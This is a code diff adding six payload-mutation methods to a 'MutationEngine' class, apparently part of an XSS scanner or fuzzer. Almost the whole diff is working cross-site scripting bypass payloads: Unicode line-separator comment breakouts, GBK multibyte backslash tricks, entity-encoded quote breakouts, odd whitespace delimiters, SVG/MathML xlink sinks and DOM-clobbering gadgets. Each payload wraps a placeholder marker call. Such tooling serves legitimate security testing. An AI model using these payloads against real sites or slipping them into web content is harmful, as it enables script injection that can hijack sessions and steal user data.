@@ -1747,5 +1747,74 @@ class MutationEngine:
 
         return variants
 
+    @staticmethod
+    def apply_unicode_line_separator_breakout(payload: str) -> List[str]:
+        """Break out of single-line JS comments and expressions using ECMAScript U+2028 and U+2029."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        return [
+            f"//\u2028__XSS__('{token}');//",
+            f"//\u2029__XSS__('{token}');//",
+            f"<script>//\u2028__XSS__('{token}')</script>",
+            f"<script>//\u2029__XSS__('{token}')</script>",
+        ]
+
+    @staticmethod
+    def apply_multibyte_gbk_backslash_escape(payload: str) -> List[str]:
+        """Exploit multi-byte charset decoding where lead bytes absorb escaping backslashes."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        return [
+            f"%bb\"__XSS__('{token}');//",
+            f"%81\"__XSS__('{token}');//",
+            f"\xbb\"__XSS__('{token}');//",
+            f"\x81\"__XSS__('{token}');//",
+        ]
+
+    @staticmethod
+    def apply_attribute_inline_entity_encoding(payload: str) -> List[str]:
+        """Generate HTML entity encoded quote breakouts that resolve inside inline event handlers."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        return [
+            f"&quot;),__XSS__('{token}')//",
+            f"&apos;),__XSS__('{token}')//",
+            f"&#34;),__XSS__('{token}')//",
+            f"&#39;),__XSS__('{token}')//",
+            f"&#x22;),__XSS__('{token}')//",
+            f"&#x27;),__XSS__('{token}')//",
+        ]
+
+    @staticmethod
+    def apply_nonstandard_whitespace_delimiters(payload: str) -> List[str]:
+        """Substitute spaces with HTML token separators: Form Feed (0x0C), Vertical Tab (0x0B), and Null (0x00)."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        return [
+            f"<img\x0csrc=x\x0conerror=__XSS__('{token}')>",
+            f"<svg\x0conload=__XSS__('{token}')>",
+            f"<img\x0bsrc=x\x0bonerror=__XSS__('{token}')>",
+            f"<svg\x09onload=__XSS__('{token}')>",
+            f"<svg/onload=__XSS__('{token}')>",
+        ]
+
+    @staticmethod
+    def apply_xml_xlink_namespace_sinks(payload: str) -> List[str]:
+        """Generate SVG and MathML XML xlink:href namespace execution sinks."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        return [
+            f"<svg><script xlink:href=\"data:,__XSS__('{token}')\"></script></svg>",
+            f"<math><a xlink:href=\"javascript:__XSS__('{token}')\">click</a></math>",
+            f"<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"javascript:__XSS__('{token}')\"/><a id=\"x\"><text y=\"20\">click</text></a></svg>",
+            f"<svg><style>*{{font-family:'<svg onload=__XSS__(\\'{token}\\')>';}}</style></svg>",
+        ]
+
+    @staticmethod
+    def apply_form_window_clobbering(payload: str) -> List[str]:
+        """Generate hierarchical DOM clobbering gadgets targeting window and document namespaces."""
+        token = MutationEngine._extract_token_from_payload(payload)
+        return [
+            f"<form id=\"window\"><input name=\"name\" value=\"javascript:__XSS__('{token}')\"></form>",
+            f"<form id=\"config\"><input name=\"url\" value=\"javascript:__XSS__('{token}')\"></form>",
+            f"<a id=\"x\" href=\"javascript:__XSS__('{token}')\">click</a>",
+        ]
+
+
 
 
